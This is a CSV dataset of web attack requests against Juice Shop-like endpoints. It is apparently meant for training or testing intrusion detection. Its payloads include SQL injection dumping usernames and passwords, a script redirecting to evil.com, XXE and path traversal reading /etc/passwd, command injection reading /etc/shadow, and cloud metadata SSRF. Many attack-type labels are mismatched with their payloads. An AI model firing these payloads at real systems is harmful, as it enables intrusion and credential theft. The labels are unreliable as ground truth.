attack_type,payload,endpoint,http_method,request_body,source_ip
xss,& ping -c 10 127.0.0.1 &,/#/search,POST,& ping -c 10 127.0.0.1 &,192.168.1.141
lfi,product=1,/redirect,POST,product=1,192.168.1.178
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.218
lfi,category=juice,/profile,POST,category=juice,192.168.1.183
xss,<img src=x onerror=alert(1)>,/rest/basket,GET,<img src=x onerror=alert(1)>,192.168.1.209
lfi,sort=price,/ftp,GET,sort=price,192.168.1.98
brute,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.112
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.47
rce,http://169.254.169.254/latest/meta-data/,/rest/user/login,GET,http://169.254.169.254/latest/meta-data/,192.168.1.134
brute,page=1,/rest/user/login,GET,page=1,192.168.1.4
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.4
brute,sort=price,/api/Products,POST,sort=price,192.168.1.38
brute,product=1,/rest/user/login,GET,product=1,192.168.1.60
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.49
lfi,category=juice,/ftp,POST,category=juice,192.168.1.125
brute,page=1,/api/Products,GET,page=1,192.168.1.197
lfi,category=juice,/redirect,POST,category=juice,192.168.1.11
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.66
brute,product=1,/rest/user/login,POST,product=1,192.168.1.121
lfi,& ping -c 10 127.0.0.1 &,/profile,GET,& ping -c 10 127.0.0.1 &,192.168.1.144
brute,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.160
brute,category=juice,/rest/basket,POST,category=juice,192.168.1.137
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,POST,http://169.254.169.254/latest/meta-data/,192.168.1.72
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,GET,<script>document.location='http://evil.com'</script>,192.168.1.14
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.86
lfi,category=juice,/ftp,POST,category=juice,192.168.1.63
lfi,sort=price,/redirect,POST,sort=price,192.168.1.203
brute,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.227
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.45
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.97
lfi,category=juice,/ftp,GET,category=juice,192.168.1.204
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.200
lfi,search=apple,/ftp,GET,search=apple,192.168.1.95
brute,sort=price,/api/Products,POST,sort=price,192.168.1.81
lfi,category=juice,/redirect,POST,category=juice,192.168.1.74
lfi,../../../../etc/passwd,/profile,GET,../../../../etc/passwd,192.168.1.45
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,POST,"' UNION SELECT username, password FROM Users--",192.168.1.120
lfi,search=apple,/profile,GET,search=apple,192.168.1.181
brute,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.247
brute,page=1,/rest/basket,GET,page=1,192.168.1.202
lfi,sort=price,/redirect,GET,sort=price,192.168.1.36
brute,page=1,/#/search,GET,page=1,192.168.1.153
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,POST,"' UNION SELECT username, password FROM Users--",192.168.1.124
rce,; cat /etc/shadow,/rest/admin/application-configuration,POST,; cat /etc/shadow,192.168.1.50
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.205
lfi,sort=price,/profile,POST,sort=price,192.168.1.25
lfi,category=juice,/profile,POST,category=juice,192.168.1.75
brute,category=juice,/api/Products,GET,category=juice,192.168.1.14
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.215
brute,category=juice,/api/Products,GET,category=juice,192.168.1.15
brute,product=1,/api/Products,POST,product=1,192.168.1.41
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.169
lfi,page=1,/ftp,POST,page=1,192.168.1.132
brute,page=1,/rest/basket,POST,page=1,192.168.1.246
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.143
brute,category=juice,/api/Products,GET,category=juice,192.168.1.4
brute,search=apple,/#/search,GET,search=apple,192.168.1.107
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.240
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.119
brute,category=juice,/#/search,POST,category=juice,192.168.1.3
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.36
lfi,product=1,/redirect,GET,product=1,192.168.1.69
lfi,sort=price,/redirect,GET,sort=price,192.168.1.231
sqli,' OR '1'='1' --,/#/search,GET,' OR '1'='1' --,192.168.1.105
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.167
brute,product=1,/api/Products,POST,product=1,192.168.1.48
brute,search=apple,/#/search,POST,search=apple,192.168.1.106
brute,product=1,/rest/user/login,POST,product=1,192.168.1.96
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.126
brute,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.4
lfi,..\..\..\windows\win.ini,/rest/basket,POST,..\..\..\windows\win.ini,192.168.1.137
lfi,category=juice,/profile,POST,category=juice,192.168.1.213
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.14
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.33
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.189
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.119
brute,product=1,/rest/user/login,POST,product=1,192.168.1.138
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.143
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.249
xss,<script>document.location='http://evil.com'</script>,/ftp,POST,<script>document.location='http://evil.com'</script>,192.168.1.172
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.146
lfi,product=1,/ftp,GET,product=1,192.168.1.152
brute,category=juice,/api/Products,GET,category=juice,192.168.1.119
xss,<img src=x onerror=alert(1)>,/rest/user/login,POST,<img src=x onerror=alert(1)>,192.168.1.39
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.206
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,POST,<script>document.location='http://evil.com'</script>,192.168.1.119
brute,product=1,/rest/basket,POST,product=1,192.168.1.72
brute,page=1,/rest/user/login,GET,page=1,192.168.1.221
brute,search=apple,/#/search,GET,search=apple,192.168.1.116
xss,| ls -la /,/#/search,POST,| ls -la /,192.168.1.127
lfi,../../../../etc/passwd,/rest/admin/application-configuration,POST,../../../../etc/passwd,192.168.1.193
brute,product=1,/api/Products,GET,product=1,192.168.1.64
lfi,category=juice,/profile,POST,category=juice,192.168.1.216
xss,| ls -la /,/#/search,POST,| ls -la /,192.168.1.201
brute,search=apple,/api/Products,POST,search=apple,192.168.1.253
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.20
lfi,page=1,/redirect,POST,page=1,192.168.1.56
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,POST,& ping -c 10 127.0.0.1 &,192.168.1.121
rce,http://169.254.169.254/latest/meta-data/,/api/Products,GET,http://169.254.169.254/latest/meta-data/,192.168.1.57
lfi,page=1,/ftp,GET,page=1,192.168.1.175
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.132
brute,product=1,/api/Products,POST,product=1,192.168.1.197
brute,sort=price,/#/search,POST,sort=price,192.168.1.112
brute,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.207
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.205
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.194
lfi,category=juice,/profile,GET,category=juice,192.168.1.20
xss,& ping -c 10 127.0.0.1 &,/api/Products,GET,& ping -c 10 127.0.0.1 &,192.168.1.225
lfi,& ping -c 10 127.0.0.1 &,/redirect,POST,& ping -c 10 127.0.0.1 &,192.168.1.62
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.143
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.248
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.181
lfi,| ls -la /,/ftp,POST,| ls -la /,192.168.1.26
brute,page=1,/api/Products,GET,page=1,192.168.1.232
rce,http://169.254.169.254/latest/meta-data/,/#/search,GET,http://169.254.169.254/latest/meta-data/,192.168.1.114
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.144
brute,page=1,/api/Products,POST,page=1,192.168.1.146
lfi,page=1,/redirect,GET,page=1,192.168.1.249
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.56
brute,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.88
lfi,../../../../etc/passwd,/rest/admin/application-configuration,POST,../../../../etc/passwd,192.168.1.217
lfi,sort=price,/profile,POST,sort=price,192.168.1.62
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.185
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/redirect,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.247
lfi,search=apple,/ftp,POST,search=apple,192.168.1.175
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.40
brute,product=1,/api/Products,GET,product=1,192.168.1.38
lfi,..\..\..\windows\win.ini,/redirect,GET,..\..\..\windows\win.ini,192.168.1.149
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.181
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.80
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.31
lfi,http://169.254.169.254/latest/meta-data/,/ftp,GET,http://169.254.169.254/latest/meta-data/,192.168.1.127
lfi,..\..\..\windows\win.ini,/api/Products,GET,..\..\..\windows\win.ini,192.168.1.35
lfi,..\..\..\windows\win.ini,/api/Products,GET,..\..\..\windows\win.ini,192.168.1.89
brute,sort=price,/api/Products,POST,sort=price,192.168.1.59
brute,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.230
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.73
brute,search=apple,/rest/basket,GET,search=apple,192.168.1.206
brute,search=apple,/rest/user/login,POST,search=apple,192.168.1.32
lfi,category=juice,/profile,POST,category=juice,192.168.1.37
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.201
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.2
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.123
lfi,category=juice,/redirect,POST,category=juice,192.168.1.24
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.120
lfi,sort=price,/profile,GET,sort=price,192.168.1.42
xss,| ls -la /,/#/search,GET,| ls -la /,192.168.1.73
lfi,product=1,/profile,GET,product=1,192.168.1.94
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,POST,http://169.254.169.254/latest/meta-data/,192.168.1.67
lfi,search=apple,/ftp,POST,search=apple,192.168.1.96
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.86
lfi,page=1,/redirect,GET,page=1,192.168.1.193
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.29
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.44
brute,page=1,/rest/basket,GET,page=1,192.168.1.4
brute,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.87
lfi,search=apple,/redirect,GET,search=apple,192.168.1.112
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.74
lfi,http://169.254.169.254/latest/meta-data/,/profile,POST,http://169.254.169.254/latest/meta-data/,192.168.1.64
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.111
brute,category=juice,/#/search,GET,category=juice,192.168.1.173
brute,page=1,/api/Products,GET,page=1,192.168.1.220
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.252
brute,page=1,/api/Products,GET,page=1,192.168.1.218
lfi,category=juice,/redirect,POST,category=juice,192.168.1.76
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.108
lfi,search=apple,/ftp,POST,search=apple,192.168.1.30
rce,http://169.254.169.254/latest/meta-data/,/api/Products,GET,http://169.254.169.254/latest/meta-data/,192.168.1.167
lfi,search=apple,/ftp,GET,search=apple,192.168.1.31
lfi,..\..\..\windows\win.ini,/rest/user/login,GET,..\..\..\windows\win.ini,192.168.1.252
lfi,search=apple,/profile,POST,search=apple,192.168.1.199
brute,product=1,/#/search,GET,product=1,192.168.1.214
lfi,..\..\..\windows\win.ini,/rest/admin/application-configuration,POST,..\..\..\windows\win.ini,192.168.1.143
brute,sort=price,/api/Products,GET,sort=price,192.168.1.165
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.127
xss,& ping -c 10 127.0.0.1 &,/#/search,POST,& ping -c 10 127.0.0.1 &,192.168.1.66
brute,page=1,/rest/user/login,POST,page=1,192.168.1.158
lfi,page=1,/redirect,POST,page=1,192.168.1.32
brute,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.22
brute,page=1,/api/Products,POST,page=1,192.168.1.59
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.33
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.33
brute,product=1,/rest/user/login,GET,product=1,192.168.1.64
brute,search=apple,/api/Products,GET,search=apple,192.168.1.12
brute,search=apple,/rest/user/login,GET,search=apple,192.168.1.113
brute,search=apple,/api/Products,GET,search=apple,192.168.1.205
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.150
lfi,search=apple,/profile,GET,search=apple,192.168.1.215
lfi,page=1,/redirect,POST,page=1,192.168.1.46
brute,page=1,/#/search,GET,page=1,192.168.1.168
lfi,| ls -la /,/profile,GET,| ls -la /,192.168.1.94
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.177
lfi,; cat /etc/shadow,/redirect,GET,; cat /etc/shadow,192.168.1.145
brute,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.65
brute,product=1,/#/search,POST,product=1,192.168.1.190
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.63
lfi,& ping -c 10 127.0.0.1 &,/ftp,POST,& ping -c 10 127.0.0.1 &,192.168.1.132
rce,| ls -la /,/rest/user/login,POST,| ls -la /,192.168.1.112
lfi,category=juice,/ftp,POST,category=juice,192.168.1.38
brute,product=1,/#/search,GET,product=1,192.168.1.228
sqli,' OR '1'='1' --,/ftp,POST,' OR '1'='1' --,192.168.1.217
lfi,sort=price,/redirect,POST,sort=price,192.168.1.44
lfi,page=1,/ftp,GET,page=1,192.168.1.141
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.88
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.46
brute,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.229
brute,category=juice,/#/search,POST,category=juice,192.168.1.124
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.40
brute,product=1,/rest/basket,POST,product=1,192.168.1.39
lfi,| ls -la /,/profile,GET,| ls -la /,192.168.1.109
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.163
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.43
lfi,search=apple,/ftp,GET,search=apple,192.168.1.28
lfi,product=1,/profile,POST,product=1,192.168.1.17
lfi,..\..\..\windows\win.ini,/#/search,POST,..\..\..\windows\win.ini,192.168.1.121
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.85
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.144
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.6
brute,page=1,/#/search,POST,page=1,192.168.1.135
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.152
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,GET,"' UNION SELECT username, password FROM Users--",192.168.1.249
lfi,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.239
brute,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.209
lfi,http://169.254.169.254/latest/meta-data/,/redirect,POST,http://169.254.169.254/latest/meta-data/,192.168.1.146
